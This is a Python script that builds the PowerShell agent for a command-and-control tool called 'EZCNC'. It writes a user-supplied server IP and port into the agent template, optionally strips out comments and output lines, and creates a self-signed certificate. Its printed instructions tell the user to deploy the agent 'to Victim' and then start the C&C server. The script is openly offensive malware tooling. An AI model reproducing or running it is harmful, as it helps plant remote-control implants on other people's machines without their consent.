#!/usr/bin/python

import os

# COMPLETE: Ask for IP of Server (in main)
# COMPLETE: Ask for Port to Listn on (in main)
# COMPLETE: Use TEMPLATE to update FINAL with IP:PORT
# COMPLETE: FUNCTION: Remove comments
# COMPLETE: FUNCTION: Remove print statements
# COMPLETE: FUNCTION: Replace "END COMMENTS" with #>
# COMPLETE: FUNCTION: Create Cert yes/no
# COMPLETE: Create a Cleanup Function (Deletes temp)
# TODO: Update EZCNC-AGENT.ps1 to not print out 404 message

###
# Global Variables
###
skeleton = './AgentRequirements/template.ps1'
finalAgent = './AgentRequirements/EZCNC-Agent.ps1'
finalTemp = './AgentRequirements/finalTemp.ps1'
temp = './AgentRequirements/temporary.ps1'
cert = "./ServerRequirements/server.pem"

# Create Temp file
if os.path.exists(temp):
    None
else:
    f = open(temp, 'w')
    f.close()

### 
# Certificate Func
###
def certificateFunc():
    while True:
        user_input = str(raw_input("[!] Do you wish to create a Self Signed Cert?\n" + "[+] Type 'yes' or 'no'\n"))
        #print(user_input)

        if user_input.lower() == 'yes':            
            print("[*] Generating Self-Signed Certificate...")
            os.system("openssl req -new -x509 -keyout " + cert + " -out " + cert + " -days 365 -nodes -subj '/C=US' >/dev/null 2>&1")
            print("[*] Certificate created and written to " + cert)
            break
        elif user_input.lower() == 'no':
            print("[*] No problem.. but make sure you have your own certificate located in ./ServerRequirements named 'server.pem'")
            break
        else:
            print('[-] Invalid command.. try again')
            continue
###
# Cleanup Function - Rename Temp to Final
###
def cleanupFunc():
    if os.path.exists(finalTemp):
        print('[*] Cleaning up...')
        #print('[*] Renaming ' + finalTemp + ' to ' + finalAgent)
        os.rename(finalTemp, finalAgent)
        print('[*] Final Agent file is located in ' + finalAgent)
        print('[*] Next Steps..')
        print('')
        print('[1] Deploy ' + finalAgent + ' Agent to Victim')
        print('[2] Run ' + finalAgent)
        print('[3] Run commandServer.py to Launch CNC Server')
    else:
        print('temp was never here')
        None

###
# Remove Print Statements Function
###
def removePrintStatements():
    while True:
        s = open(finalTemp, "r").read() # Open Final Name
        user_input = str(raw_input("[!] Do you wish to strip print statements from final Agent File?" + '\n' + "[+] Type 'yes' or 'no'" + '\n'))

        #print(user_input)
        # Print Temp Function Variable
        printTemp = "printTemp"
        if user_input.lower() == 'yes':
            g = open(printTemp, "w")
            for line in s.splitlines():
                if not (line.startswith('Write-Output') or line.startswith('    Write-Output') or line.startswith('        Write-Output') or line.startswith('write-host') or line.startswith('    write-host') or line.startswith('        write-host')):
                    g.write(line + '\n')
            g.close()
            os.rename(printTemp, finalTemp)
            print("[*] Removed Print Statements")
            #print('[*] Renamed custom ' + printTemp + ' to ' + finalTemp)
            break
        elif user_input.lower() == 'no':
            print("[!] Leaving print statements..")
            break
        else:
            print("[-] Invalid command.. try again")
            continue



###
# Strip Comments Function
###
def stripCommentsFunc():
    while True:
        # Vriable for reading finalName
        #print('[!] Opening Temp File..')
        s = open(temp, 'r').read()
        user_input = str(raw_input("[!] Do you wish to strip comments from final Agent File?" + '\n' + "[+] Type 'yes' or 'no'" + '\n'))

        #print(user_input)

        if user_input.lower() == 'yes':
            print("[!] Commenting out File...")

            # Create SECOND TEMP
            #print('!] Writing to Final Temp')
            g = open(finalTemp, "w")
            for line in s.splitlines():
                if not (line.startswith('#') or line.startswith('    #') or line.startswith('        #')):
                    g.write(line + '\n')
            g.close()
            # New Agent created, so delete old agent
            os.remove(temp)

            ### REPLACE END COMMENTS WITH #>
            #print('[!] Now replacing END COMMENTS with #>')
            with open(finalTemp, 'r') as f:
                for line in f:
                    line = line.replace('END COMMENTS', '#>')
                    i = open('commentTemp', 'a')
                    i.write(line)
                    i.close
            if os.path.exists('commentTemp'):
                os.rename('commentTemp', finalTemp)
            else:
                None # Do Nothing
            #print('[!] Just created ' + finalTemp + ' and removed ' + temp)

            break
        elif user_input.lower() == 'no':
            print("[!] Leaving comments...")
            # Rename old file to new agent
            os.rename(temp, finalTemp)
            #print('[!] Renaming Print Statement ' + temp + ' to ' + finalTemp)
            break
        else:
            print("[-] Invalid command.. try again")
            continue

def addServerPortFunc():
    print "[+] What is the IP Address of the Server"
    ip = str(raw_input(''))
    print "[+] What is the Port you want to listen on"
    port = str(raw_input())
    print('[!] Server is ' + ip + ':' + port)
    server = (ip+':'+port)

    # Old line and New Line
    old = '$ccserver = "192.168.9.4:8080"'
    new = '$ccserver = "' + server + '"'

    # Open the temporary.ps1 and replace with user input of C&C Server
    with open(skeleton, 'r') as f:
        for line in f:
            line = line.replace(old, new)
            i = open(temp, 'a')
            i.write(line)
            i.close
    #print('[!] Temporary has been APPENDED with Server:Port')

###
# Main Function
###
def main():
    # Test question..
    '''
    if os.path.exists(temp):
        print('[!] Temporary Exists and is Blank')
    else:
        print('')
    '''

if __name__== "__main__" :
    
    main() # Not necessary tbh

    addServerPortFunc() # Adds server:ip to temp file

    stripCommentsFunc() # Strips comments of temp file

    removePrintStatements() #Removes print statements of temp file

    certificateFunc() # Creates certificate
    
    cleanupFunc() # Renames temp to final name
